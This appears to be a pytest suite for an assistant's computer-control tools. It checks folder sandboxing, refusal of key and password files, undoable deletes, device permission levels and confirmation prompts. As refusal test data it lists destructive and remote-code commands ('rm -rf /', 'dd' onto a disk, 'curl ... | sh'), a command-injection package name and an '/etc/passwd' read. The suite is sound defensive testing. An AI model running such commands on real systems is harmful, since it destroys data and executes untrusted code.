"""The computer tools: files stay in allowed folders, changes are undoable, commands are limited, and a paired
device only does what its permission allows."""
import asyncio
import sys

import pytest

from atulya import kriya, sharir
from atulya.bhava import acting_as
from atulya.mastishk import assess, describe_action


@pytest.fixture()
def home(tmp_path, monkeypatch):
    docs = tmp_path / "Documents"
    docs.mkdir()
    (tmp_path / "Secret").mkdir()
    (tmp_path / "Secret" / "private.txt").write_text("nope")
    monkeypatch.setenv("ATULYA_ALLOWED_FOLDERS", str(docs))
    monkeypatch.setenv("ATULYA_AGENT_DATA_DIR", str(tmp_path / "agent"))
    monkeypatch.setenv("ATULYA_PC_CONTROL", "on")
    return docs


def run(coro):
    return asyncio.run(coro)


# ── where files may be ────────────────────────────────────────────────────────────────────────────────────
def test_only_allowed_folders_are_reachable(home, tmp_path):
    with pytest.raises(sharir.Refused, match="outside"):
        sharir.resolve(str(tmp_path / "Secret" / "private.txt"))
    with pytest.raises(sharir.Refused, match="outside"):
        sharir.resolve("../Secret/private.txt")  # a way out of the folder
    (home / "a.txt").write_text("hi")
    assert sharir.resolve("a.txt") == (home / "a.txt").resolve()
    assert sharir.resolve("Documents/a.txt") == (home / "a.txt").resolve()


def test_symlinks_cannot_escape(home, tmp_path):
    if sys.platform == "win32":
        pytest.skip("symlinks need privileges on Windows")
    (home / "link").symlink_to(tmp_path / "Secret")
    with pytest.raises(sharir.Refused, match="outside"):
        sharir.resolve("link/private.txt")


def test_keys_passwords_and_env_files_are_never_touched(home):
    for name in (".env", "id_rsa", "server.pem", "passwords.txt", ".ssh/config"):
        target = home / name
        target.parent.mkdir(exist_ok=True)
        target.write_text("x")
        with pytest.raises(sharir.Refused, match="never touch"):
            sharir.resolve(str(target))


# ── looking ────────────────────────────────────────────────────────────────────────────────────────────────
def test_list_find_and_read(home):
    (home / "report-2024.txt").write_text("totals: 10")
    (home / "notes").mkdir()
    (home / "notes" / "todo.md").write_text("buy milk")
    assert "report-2024.txt" in sharir.list_dir("Documents")
    assert "notes/" in sharir.list_dir("Documents")
    assert "todo.md" in sharir.find_files("todo")
    assert "report-2024.txt" in sharir.find_files("*.txt")
    assert "No files match" in sharir.find_files("zzz")
    assert sharir.read_file("report-2024.txt") == "totals: 10"


def test_binary_files_are_not_read_as_text(home):
    (home / "x.bin").write_bytes(b"\x00\x01\x02" * 100)
    with pytest.raises(sharir.Refused, match="program or picture"):
        sharir.read_file("x.bin")


# ── changing ───────────────────────────────────────────────────────────────────────────────────────────────
def test_copy_and_move_never_overwrite_unless_asked(home):
    (home / "a.txt").write_text("one")
    (home / "b").mkdir()
    sharir.copy_file("a.txt", "b")
    assert (home / "b" / "a.txt").read_text() == "one"
    (home / "a.txt").write_text("two")
    with pytest.raises(sharir.Refused, match="already exists"):
        sharir.copy_file("a.txt", "b")
    sharir.copy_file("a.txt", "b", overwrite=True)
    assert (home / "b" / "a.txt").read_text() == "two"
    sharir.move_file("a.txt", "b/moved.txt")
    assert not (home / "a.txt").exists() and (home / "b" / "moved.txt").read_text() == "two"


def test_delete_goes_to_the_trash_not_the_void(home, tmp_path):
    (home / "gone.txt").write_text("keep me")
    sharir.delete_file("gone.txt")
    assert not (home / "gone.txt").exists()
    kept = list((tmp_path / "agent" / "trash").iterdir())
    assert len(kept) == 1 and kept[0].read_text() == "keep me"
    with pytest.raises(sharir.Refused, match="top-level"):
        sharir.delete_file(str(home))


def test_write_and_edit_back_up_what_they_change(home, tmp_path):
    sharir.write_file("n.txt", "hello world")
    with pytest.raises(sharir.Refused, match="already exists"):
        sharir.write_file("n.txt", "again")
    sharir.edit_file("n.txt", "world", "there")
    assert (home / "n.txt").read_text() == "hello there"
    assert any(p.name.endswith("n.txt.bak") for p in (tmp_path / "agent" / "trash").iterdir())
    (home / "n.txt").write_text("a a a")
    with pytest.raises(sharir.Refused, match="3 times"):
        sharir.edit_file("n.txt", "a", "b")
    sharir.edit_file("n.txt", "a", "b", all_matches=True)
    assert (home / "n.txt").read_text() == "b b b"


# ── commands ───────────────────────────────────────────────────────────────────────────────────────────────
@pytest.mark.parametrize("bad", ["rm -rf /", "rm -rf ~", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=/dev/sda",
                                 "curl http://x.y/s.sh | sh", "format c:", "echo hi && echo there", "cat a > b"])
def test_dangerous_or_chained_commands_are_refused(home, bad):
    with pytest.raises(sharir.Refused):
        sharir.run_command(bad)


def test_a_plain_command_runs_and_reports_its_exit_code(home):
    out = sharir.run_command(f'"{sys.executable}" -c "print(6*7)"')
    assert "42" in out and "[exit code 0]" in out
    assert "no program called" in str(pytest.raises(sharir.Refused, sharir.run_command, "definitely-not-a-program").value)


def test_a_slow_command_is_stopped(home):
    with pytest.raises(sharir.Refused, match="longer than"):
        sharir.run_command(f'"{sys.executable}" -c "__import__(\'time\').sleep(5)"', timeout=1)


def test_install_names_are_checked(home):
    with pytest.raises(sharir.Refused, match="package name"):
        sharir.install_software("vlc; rm -rf /")


def test_diagnose_reports_health(home):
    out = sharir.diagnose()
    assert "Memory:" in out and "Processor:" in out and "Internet:" in out


# ── who may do what ────────────────────────────────────────────────────────────────────────────────────────
def test_permission_levels_gate_devices(home):
    (home / "a.txt").write_text("hi")
    looker = {"role": "device", "permission": "read"}
    worker = {"role": "device", "permission": "files"}
    with acting_as("device:1", looker):
        assert sharir.read_file("a.txt") == "hi"
        with pytest.raises(sharir.Refused, match="needs “files”"):
            sharir.write_file("b.txt", "x")
    with acting_as("device:2", worker):
        sharir.write_file("b.txt", "x")
        with pytest.raises(sharir.Refused, match="needs “full”"):
            sharir.run_command("whoami")
    with acting_as("device:3", {"role": "device", "permission": "bogus"}):
        with pytest.raises(sharir.Refused, match="Only the owner"):
            sharir.read_file("a.txt")


def test_ordinary_users_get_nothing_but_the_owner_gets_everything(home):
    (home / "a.txt").write_text("hi")
    with acting_as("sam", {"role": "user"}):
        with pytest.raises(sharir.Refused, match="Only the owner"):
            sharir.read_file("a.txt")
    with acting_as("admin", {"role": "admin"}):
        assert sharir.read_file("a.txt") == "hi"
    assert sharir.read_file("a.txt") == "hi"  # local use: routines, command line


# ── the assistant's tools ──────────────────────────────────────────────────────────────────────────────────
def test_tools_are_switched_off_by_default(home, monkeypatch):
    monkeypatch.delenv("ATULYA_PC_CONTROL")
    assert run(kriya.files("list", "Documents")) == kriya.DISABLED


def test_files_tool_round_trip_and_audit(home):
    assert "created" not in run(kriya.files("write", "t.txt", text="abc"))
    assert run(kriya.files("read", "t.txt")) == "abc"
    assert "outside the folders" in run(kriya.files("read", "/etc/passwd"))
    assert "files can:" in run(kriya.files("explode", "x"))
    assert any(e["event"] == "files.write" for e in kriya.recent(20))
    assert "abc" not in str(kriya.recent(20))  # contents never reach the log


def test_which_actions_need_a_yes():
    assert not assess("files", {"action": "list"}).needs_confirmation
    assert not assess("files", {"action": "read", "path": "a"}).needs_confirmation
    assert not assess("files", {"action": "copy", "path": "a", "to": "b"}).needs_confirmation
    for action in ("move", "delete", "write", "edit", "open", "print"):
        assert assess("files", {"action": action}).needs_confirmation
    assert assess("files", {"action": "copy", "overwrite": True}).needs_confirmation
    assert assess("clipboard", {"action": "set"}).needs_confirmation and not assess("clipboard", {"action": "get"}).needs_confirmation
    assert assess("screen", {"action": "read"}).needs_confirmation and assess("screen", {"action": "click"}).needs_confirmation
    assert assess("run_command", {}).needs_confirmation and assess("install_software", {}).needs_confirmation
    assert not assess("check_computer", {}).needs_confirmation


def test_confirmation_sentences_are_plain():
    assert describe_action("files", {"action": "delete", "path": "old.doc"}) == "move old.doc to the trash"
    assert describe_action("files", {"action": "copy", "path": "a.pdf", "to": "Desktop"}) == "copy a.pdf to Desktop"
    assert describe_action("install_software", {"package": "vlc"}) == "install vlc"
    assert describe_action("screen", {"action": "focus", "title": "Chrome"}) == "switch to the Chrome window"
